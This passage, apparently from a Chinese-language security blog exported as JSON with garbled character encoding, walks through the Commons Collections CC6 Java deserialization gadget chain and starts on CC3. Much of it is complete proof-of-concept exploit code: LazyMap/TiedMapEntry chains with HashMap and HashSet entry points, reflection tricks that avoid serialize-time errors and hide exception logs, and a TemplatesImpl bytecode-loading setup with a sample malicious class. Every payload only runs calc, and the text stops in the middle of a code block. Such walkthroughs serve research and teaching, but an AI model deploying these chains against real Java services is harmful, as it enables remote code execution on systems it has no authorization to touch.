·æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼Œä½†æ˜¯è¿™é‡Œçš„å¼‚å¸¸æ—¥å¿—ç‰¹å¾å·²ç»è¢«æ”¹å˜äº†ã€‚\nè§£å†³æ–¹æ³•å°±åœ¨é‡Œé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨åˆ©ç”¨é“¾çš„æœ€ååŠ ä¸Šä¸€ä¸ªnew ConstantTransformer(1)ï¼Œç†Ÿæ‚‰è¿™ä¸ªç±»çš„transformer()æ–¹æ³•å°±å¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œä¸ä¼šç®¡ä¼ å…¥çš„inputï¼Œè¿™é‡Œå°±ä¼šç›´æ¥è¿”å›ä¸€ä¸ª1ï¼Œå†ç»“åˆæ­£å¸¸çš„ä¾‹å¦‚put(1,\u0026quot;xxx\u0026quot;)è¿™ç§ï¼Œè¿™æ ·åœ¨åºåˆ—åŒ–æ—¶å°±ä¸ä¼šæŠ¥æ— æ³•åºåˆ—åŒ–çš„é”™è¯¯ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥èµ·åˆ°éšè—æ—¥å¿—çš„ä½œç”¨ã€‚\næ‰€ä»¥ä¿®æ”¹åçš„POCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry o = new TiedMapEntry(lazy,null); HashMap hashMap = new HashMap(); hashMap.put(o,\u0026#34;xxx\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } æ²¡æœ‰æŠ¥é”™ï¼Œä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰æˆåŠŸååºåˆ—åŒ–ï¼Œå¦åˆ™åº”è¯¥ä¼šå¼¹å‡ºä¸¤ä¸ªè®¡ç®—æœºã€‚\nè°ƒè¯•ä¸€ä¸‹ï¼ŒåŠ æ–­ç‚¹å¦‚ä¸‹ï¼š åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­å‘ç°å¦‚ä¸‹æƒ…å†µ\nä¹Ÿå°±æ˜¯è¿™é‡Œçš„ifæ¡ä»¶å¹¶æ²¡æœ‰é€šè¿‡ï¼Œè¿˜æ˜¾ç¤ºä¸€ä¸ªnullï¼Œå°±æ˜¯å› ä¸ºæˆ‘åœ¨ä¼ åˆå§‹åŒ–TiedMapEntryæ—¶å°†keyè®¾ç½®ä¸ºäº†nullï¼Œè€Œè°ƒç”¨get()æ–¹æ³•çš„é€»è¾‘æ˜¯å°†keyä¼ è¿›å»äº†çš„ï¼š\nè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåœ¨LazyMapçš„get()æ–¹æ³•ä¸­æ˜¾ç¤ºçš„æ˜¯nullã€‚\næ‰€ä»¥éœ€è¦æ”¹ä¸€ä¸‹POCï¼Œè¿™é‡Œç›´æ¥å°†keyè®¾ç½®æˆä¸€ä¸ªå¯è§å­—ç¬¦å°±è¡Œäº†ï¼Œå…·ä½“çœ‹åé¢çš„ä»£ç ã€‚\nåŒæ—¶è§£å†³ä¸€ä¸ªé—®é¢˜ï¼šåœ¨åºåˆ—åŒ–ä¹‹å‰è°ƒç”¨put()æ—¶ä¼šå¼¹å‡ºè®¡ç®—æœºçš„é—®é¢˜ æ€è·¯ï¼šå¯ä»¥å…ˆä¼ å…¥ä¸€ä¸ªå‡çš„â€œé“¾â€ï¼Œåœ¨putè¿‡åå†è°ƒç”¨åå°„å°†è¿™ä¸ªåˆ©ç”¨é“¾ä¼ å›å»ã€‚\nçœ‹è¿™ä¸ªChainedTransformerçš„åˆ©ç”¨çš„å˜é‡ï¼š ä¹Ÿå°±æ˜¯è¿™ä¸ªiTransformerså˜é‡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™æ ·å¹²ï¼Œçœ‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 //å…ˆå®šä¹‰ä¸€ä¸ªå‡çš„transformer Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; //å†å£°æ˜ä¸€ä¸ªåˆ©ç”¨é“¾ Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; //å…ˆä¼ å…¥å‡çš„transformer Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); //åœ¨putè¿‡åï¼Œåœ¨åºåˆ—åŒ–ä¹‹å‰ï¼Œè°ƒç”¨åå°„å°†å‡çš„é“¾æ¢æˆçœŸçš„chainpart Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); //ç„¶åå†è¿›è¡Œåºåˆ—åŒ– æ•´åˆè¿›å…¨éƒ¨ä»£ç å°±æ˜¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } æˆåŠŸä¸å†å¼¹å‡ºç”±äºputè€Œå¼•èµ·çš„è®¡ç®—æœºï¼Œä½†æ˜¯ååºåˆ—åŒ–åŒ–çŸ³ç­æœ‰å¼¹å‡ºè®¡ç®—æœºã€‚\né‚£ä¹ˆä¸ºä»€ä¹ˆæ²¡æœ‰ååºåˆ—åŒ–æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼ŸåŒæ ·è°ƒè¯•ï¼Œå‘ç°ï¼š\nè¿™é‡Œçš„keyæ˜¯fupancï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨å®ä¾‹åŒ–æ—¶TiedMapEntryä¼ å…¥çš„\u0026quot;fupanc\u0026quot;ï¼Œå¯¹äºè¿™é‡Œçš„keyä¸ºfupancå¾ˆæ­£å¸¸\nä½†æ˜¯è¿™é‡Œçš„get()æ–¹æ³•çš„ifæ¡ä»¶æ²¡æœ‰é€šè¿‡çš„åŸå› ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜æœ‰å¯¹è±¡ä¸­æœ‰fupancè¿™ä¸ªé”®ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ä¸ªç°è±¡å‘¢ï¼Œçœ‹ä»£ç \nåŸå› å°±æ˜¯è¿™ä¸ªï¼Œputæ–¹æ³•è¿½æº¯æºç åä¹Ÿä¼šè°ƒç”¨hashCode()æ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œä¼ å…¥äº†TiedMapEntryç±»å¯¹è±¡çš„outerMapï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿä¼šè¿›å…¥åˆ°LazyMap#get()ï¼Œå‰©ä¸‹é‡ç‚¹çœ‹get()æ–¹æ³•çš„æºç ï¼š æˆ‘ä»¬ç¬¬ä¸€æ¬¡ç¡®å®æ˜¯æ²¡æœ‰keyä¸ºfupancçš„é”®å€¼å¯¹ï¼Œä½†æ˜¯çœ‹get()æ–¹æ³•çš„æºç ï¼Œåœ¨è¿›å…¥ifæ¡ä»¶åï¼Œè¿™é‡Œç»è¿‡transformæ–¹æ³•è¿”å›valueï¼Œåœ¨ifè¯­å¥çš„æœ€åè°ƒç”¨äº†this.map.put(key,value); ä¹Ÿå°±æ˜¯è°ƒç”¨äº†HashMapçš„putæ–¹æ³•å¹¶ä¼ å…¥äº†ä¸€ä¸ªkeyä¸ºfupancï¼Œvalueä¸º1çš„é”®å€¼å¯¹ï¼ˆKey=fupancï¼ŒValue=1ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šå› ä¸ºå¯¹è±¡ä¸­æœ‰è¿™ä¸ªé”®ä¸ºfupancçš„é”®å€¼å¯¹è€Œå¤±è´¥ã€‚\nè§£å†³æ–¹æ³•ï¼šå¾ˆç®€å•ï¼Œåœ¨è°ƒç”¨putæ–¹æ³•åï¼Œæˆ‘ä»¬å†è°ƒç”¨removeæ–¹æ³•æ¥åˆ æ‰è¿™ä¸ªé”®å€¼å¯¹å³å¯ï¼ˆä¸€å®šè¦æ³¨æ„é”®å€¼å¯¹æ‰€å±å¯¹è±¡çš„é—®é¢˜ï¼‰ã€‚\né‚£ä¹ˆæœ€ç»ˆçš„POCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//è¿™é‡Œæ³¨æ„fupancæ‰€å±å¯¹è±¡ï¼Œä½¿ç”¨lazyä¹Ÿè¡Œ Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼š\né—®é¢˜æ€»ç»“ æ€»ç»“å‰é¢çš„é—®é¢˜ï¼š\næ— æ³•åºåˆ—åŒ–Processå¯¹è±¡é—®é¢˜ åºåˆ—åŒ–ä¹‹å‰å¼¹è®¡ç®—æœºçš„è§£å†³æ–¹æ³• éœ€è¦removeçš„åŸå› ã€‚ åˆ©ç”¨HashSeté“¾ ysoserialé“¾ä»‹ç»äº†java.util.HashSetä½œä¸ºååºåˆ—åŒ–çš„å…¥å£ï¼Œåœ¨HashSetç±»çš„readObject()æ–¹æ³•çš„æœ€åï¼Œä¼šè§¦å‘map.putæ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Consume and ignore stream fields (currently zero). s.readFields(); // Read capacity and verify non-negative. int capacity = s.readInt(); if (capacity \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal capacity: \u0026#34; + capacity); } // Read load factor and verify positive and non NaN. float loadFactor = s.readFloat(); if (loadFactor \u0026lt;= 0 || Float.isNaN(loadFactor)) { throw new InvalidObjectException(\u0026#34;Illegal load factor: \u0026#34; + loadFactor); } // Clamp load factor to range of 0.25...4.0. loadFactor = Math.min(Math.max(0.25f, loadFactor), 4.0f); // Read size and verify non-negative. int size = s.readInt(); if (size \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal size: \u0026#34; + size); } // Set the capacity according to the size and load factor ensuring that // the HashMap is at least 25% full but clamping to maximum capacity. capacity = (int) Math.min(size * Math.min(1 / loadFactor, 4.0f), HashMap.MAXIMUM_CAPACITY); // Constructing the backing map will lazily create an array when the first element is // added, so check it before construction. Call HashMap.tableSizeFor to compute the // actual allocation size. Check Map.Entry[].class since it\u0026#39;s the nearest public type to // what is actually created. SharedSecrets.getJavaOISAccess() .checkArray(s, Map.Entry[].class, HashMap.tableSizeFor(capacity)); // Create backing HashMap map = (((HashSet\u0026lt;?\u0026gt;)this) instanceof LinkedHashSet ? new LinkedHashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor) : new HashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor)); // Read in all elements in the proper order. for (int i=0; i\u0026lt;size; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) E e = (E) s.readObject(); map.put(e, PRESENT); } } é‡ç‚¹å°±æ˜¯æœ€åçš„forå¾ªç¯ï¼š è¿™é‡Œçš„mapåŒæ ·æ˜¯ä¸€ä¸ªHashMapå¯¹è±¡ï¼ŒHashSetç±»åˆå§‹åŒ–æ—¶åŸºæœ¬éƒ½æ˜¯å°†mapè®¾ç½®ä¸ºä¸€ä¸ªåˆå§‹åŒ–çš„HashMapç±»ï¼š\nç­‰æ„é€ æ–¹æ³•ã€‚\nè€ŒHashMap.putæ–¹æ³•å‰é¢ä¹Ÿè¯´è¿‡ï¼Œæºç æ”¾è¿‡æ¥ä¸€ä¸‹ï¼š\næ‰€ä»¥ç„¶åè°ƒç”¨hash() ==\u0026gt; hashCode() ==\u0026gt; getValue() ==\u0026gt; get() ==\u0026gt; transform()ä¹Ÿå°±æ˜¯æˆ‘ä»¬å·²ç»ç†Ÿæ‚‰çš„æ“ä½œäº†ã€‚\næ‰€ä»¥åœ¨å‰é¢çš„HashSet#readObject()ä¸­çš„eéœ€è¦ä¸ºTiedMapEntrryç±»å®ä¾‹\næ¥ç¨å¾®çœ‹ä¸€ä¸‹HashSetç±»çš„å˜é‡ï¼š\nè¿™é‡Œç›´æ¥è¯´æ˜äº†PRESENTçš„å€¼ä¸ºObjectç±»çš„å®ä¾‹ã€‚å¹¶ä¸”æ³¨æ„çœ‹HashSetç±»çš„æ„é€ æ–¹æ³•ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯ç›´æ¥å°†mapå®šä¹‰ä¸ºHashMapç±»çš„å®ä¾‹ã€‚æ‰€ä»¥è¿™é‡Œåœ¨åˆ©ç”¨HaseSetç±»æ—¶ç›´æ¥æ”¾å¿ƒå°†mapç›´æ¥å½“åšHashMapå¯¹è±¡å³å¯ã€‚\nåŒæ—¶åœ¨HashSetä¸­æä¾›äº†ä¸€ä¸ªaddæ–¹æ³•ï¼š è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨å°±æ˜¯å‘ HashSet ä¸­æ·»åŠ ä¸€ä¸ªå…ƒç´ ã€‚å¦‚æœè¯¥å…ƒç´ å·²ç»å­˜åœ¨äº HashSet ä¸­ï¼Œé‚£ä¹ˆä¸ä¼šæ·»åŠ ï¼Œå¹¶ä¸”è¿”å› falseã€‚å¦åˆ™ï¼Œä¼šå°†è¯¥å…ƒç´ æ·»åŠ åˆ° HashSet ä¸­ï¼Œå¹¶è¿”å› trueã€‚\næµ‹è¯•ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import java.util.HashSet; public class Main{ public static void main(String[] args) { HashSet hash = new HashSet(); System.out.println(hash.add(\u0026#34;fupanc\u0026#34;)); System.out.println(hash.add(\u0026#34;haha\u0026#34;)); System.out.println(hash.add(\u0026#34;fupanc\u0026#34;)); } } /*output: true true false è°ƒè¯•ä¸€ä¸‹ï¼Œåœ¨trueéƒ¨åˆ†åŠ æ–­ç‚¹ï¼š è¿›å…¥add()æ–¹æ³•æºç \néšåç¡®å®è¿›å…¥äº†putæ–¹æ³•ï¼Œï¼š\nåŒæ—¶è·Ÿä¸€ä¸‹æºç ï¼Œç¡®å®è¿›è¡Œäº†åœ¨HashMapä¸­çš„putæ“ä½œã€‚ä¸ºäº†æ–¹ä¾¿ç†è§£è¿™é‡Œçš„è¿”å›trueå’Œfalseçš„åŒºåˆ«ï¼Œè¿˜æ˜¯ç”¨ä»£ç æ¥è¯´æ˜ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import java.util.HashSet; import java.util.HashMap; public class Main{ public static void main(String[] args) { HashSet hash = new HashSet(); System.out.println(hash.add(\u0026#34;fupanc\u0026#34;)); System.out.println(hash.add(\u0026#34;haha\u0026#34;)); System.out.println(hash.add(\u0026#34;fupanc\u0026#34;)); // HashMap hashMap = new HashMap(); System.out.println(hashMap.put(\u0026#34;fupanc\u0026#34;,\u0026#34;xxxx\u0026#34;)); System.out.println(hashMap.put(\u0026#34;fupanc\u0026#34;,\u0026#34;xxxx\u0026#34;)); } } /*output: true true false null xxxx ä¹Ÿå°±æ˜¯åœ¨HashMapçš„putæ–¹æ³•ä¸­ï¼Œå¦‚æœæ²¡æœ‰é”®åˆ™ä¼šæˆåŠŸæ”¾å…¥é”®å€¼å¯¹å¹¶è¿”å›nullï¼Œå¦åˆ™å°±ä¼šè¿”å›é”®å¯¹åº”çš„å€¼ã€‚\nç°åœ¨å¯¹äºå‰é¢çš„addæ–¹æ³•è¿”å›çš„å¸ƒå°”å€¼å°±å¾ˆå¥½ç†è§£äº†ï¼š\nå› ä¸ºæˆåŠŸputè¿›äº†fupané”®å’Œhahaé”®ï¼Œæ‰€ä»¥è¿”å›nullï¼Œä¸addæ–¹æ³•ä¸­å®šä¹‰çš„map.put(e, PRESENT)==nullç­‰å·æˆç«‹ï¼Œè¿”å›tureï¼Œè¡¨æ˜æˆåŠŸæ”¾å…¥é”®å€¼å¯¹ï¼Œ è€Œç”±äºå‰é¢å·²ç»putè¿›äº†fupancé”®ï¼Œå¯¼è‡´å†æ¬¡è°ƒç”¨putæ·»åŠ fupancé”®è¿”å›çš„æ˜¯å‰é¢å®šä¹‰çš„fupancé”®çš„valueï¼Œåœ¨è¿™é‡Œä¹Ÿå°±æ˜¯Objectç±»çš„å®ä¾‹ï¼Œä½†è¿™æ ·å¹¶ä¸ä¸nullç›¸åŒï¼Œæ‰€ä»¥è¿”å›çš„æ˜¯falseï¼Œè¡¨æ˜å¹¶æ²¡æœ‰æˆåŠŸæ”¾å…¥é”®å€¼å¯¹ ç°åœ¨ä¹Ÿå°±åŸºæœ¬é€šäº†ï¼Œç»“åˆå‰é¢çš„HashMapçš„ç†è§£ï¼Œå¯ä»¥ç›´æ¥ç¼–å†™ä¸‹é¢çš„POCæ¥æµ‹è¯•ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashSet; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); HashMap haha =new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet hashSet = new HashSet(); hashSet.add(outerMap); haha.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashSet); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } è¿è¡ŒåæˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼š\néœ€è¦æ³¨æ„çš„åœ°æ–¹å’Œå‰é¢HashMapåˆ©ç”¨é“¾å·®ä¸å¤šï¼Œè¯´åˆ°åº•è¿™ä¸ªHashSetä¹Ÿå°±æ˜¯é—´æ¥è°ƒç”¨HashMapçš„putæ–¹æ³•ï¼Œæœ¬è´¨æ˜¯ä¸€æ ·çš„ã€‚\nå¥½å¤„ è¿™ä¸¤ä¸ªåˆ©â½¤é“¾å¯ä»¥åœ¨Java 7å’Œ8çš„â¾¼ç‰ˆæœ¬è§¦å‘ï¼Œåº”è¯¥æ˜¯é€šæ€Java7ã€8ç‰ˆæœ¬çš„ã€‚\n","date":"2024-07-19T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/cc6/","title":"CC6"},{"content":"CC3 CC3å°±æ˜¯å°†CC1å’ŒCC6è°ƒç”¨é“¾å’ŒåŠ¨æ€åŠ è½½å­—èŠ‚ç åŠ åœ¨ä¸€èµ·ï¼Œæ‰€ä»¥éœ€è¦æœ‰åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„çŸ¥è¯†ã€‚\nåˆ©ç”¨TemplatesImplæ„é€ CC3 åœ¨å‰é¢åšå®¢çš„æ–‡ç« ä¸­ï¼Œè®²è¿°äº†Javaä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•ï¼Œå…¶ä¸­å°±è¯´æ˜äº†TemplatesImplçš„ç”¨æ³•ï¼Œé€šè¿‡è°ƒç”¨å…¶newTransformer()æ¥å®ç°é“¾å­çš„èµ·ç‚¹\nåœ¨åŠ¨æ€åŠ è½½å­—èŠ‚ç ä¸­ï¼Œåˆ©ç”¨TemplatesImplæ„å»ºçš„POCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Base64.getDecoder().decode(\u0026#34;xxx\u0026#34;); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ctf.newTransformer(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æ¶æ„ç±»çš„ç¤ºä¾‹ä»£ç ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } æƒ³è¦åœ¨ååºåˆ—åŒ–ä¸­åˆ©ç”¨TemplatesImplæ¥åŠ è½½å­—èŠ‚ç ï¼Œéœ€è¦åœ¨ååºåˆ—åŒ–ä¸­æ‰§è¡ŒTemplatesImplå¯¹è±¡çš„newTransformeræˆ–getOutputPropertiesæ–¹æ³•\nç»“åˆåœ¨CC1ä¸­çš„TransformedMapé“¾çš„åŸºæœ¬ä»£ç çš„ç®€åŒ–ä»£ç ï¼Œå¯ä»¥å¦‚ä¸‹æ„é€ ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Base64.getDecoder().decode(\u0026#34;xxx\u0026#34;); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(chainPart); } 